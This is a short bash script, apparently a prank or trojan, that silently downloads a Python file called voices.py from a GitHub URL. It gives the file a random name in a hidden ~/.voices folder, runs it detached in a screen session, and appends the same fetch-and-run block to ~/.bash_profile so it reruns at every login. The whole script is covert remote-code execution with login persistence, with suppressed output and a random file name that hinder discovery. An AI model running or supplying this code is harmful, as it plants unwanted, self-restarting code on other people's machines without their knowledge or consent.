#!/bin/bash
if [ ! -d \"~/.voices\" ]; then
    mkdir ~/.voices
fi
cd ~/.voices
VOICES=$RANDOM.py
curl -O https://github.com/dcramer/voices.py/raw/master/voices.py > /dev/null 2>&1
mv voices.py $VOICES
screen -d -m python $VOICES

echo "if [ ! -d \"~/.voices\" ]; then
    mkdir ~/.voices
    cd ~/.voices
    VOICES=$RANDOM.py
    curl -O https://github.com/dcramer/voices.py/raw/master/voices.py > /dev/null 2>&1
    mv voices.py $VOICES
    screen -d -m python $VOICES
fi" >> ~/.bash_profile